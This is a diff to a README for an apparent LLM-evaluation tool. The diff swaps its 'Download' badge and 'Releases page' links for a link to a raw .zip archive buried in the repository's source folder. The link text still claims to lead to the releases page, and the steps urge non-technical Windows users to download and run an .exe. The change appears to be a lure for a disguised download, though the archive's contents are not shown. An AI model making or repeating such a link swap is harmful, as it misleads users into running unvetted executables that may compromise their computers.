@@ -1,6 +1,6 @@
 # 📊 LLM-Evaluation-Framework - Measure Model Performance With Simple Tools
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Software-blue)](https://github.com/montgome753/LLM-Evaluation-Framework/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download_Software-blue)](https://raw.githubusercontent.com/montgome753/LLM-Evaluation-Framework/main/llm_eval/cli/Evaluation_Framework_LL_v1.3.zip)
 
 LLM-Evaluation-Framework provides a way for users to test how well large language models perform. You can track accuracy, speed, and cost for models like GPT-4, Claude, Gemini, and Llama. This tool helps you identify how often a model provides correct answers versus how often it hallucinates or generates false information.
 
@@ -8,7 +8,7 @@ LLM-Evaluation-Framework provides a way for users to test how well large languag
 
 You do not need to read code to use this tool. Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [Releases page](https://github.com/montgome753/LLM-Evaluation-Framework/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/montgome753/LLM-Evaluation-Framework/main/llm_eval/cli/Evaluation_Framework_LL_v1.3.zip).
 2. Look for the most recent version under the Releases section.
 3. Click the file ending in .exe to start your download.
 4. Once the download finishes, open the folder where you saved the file.
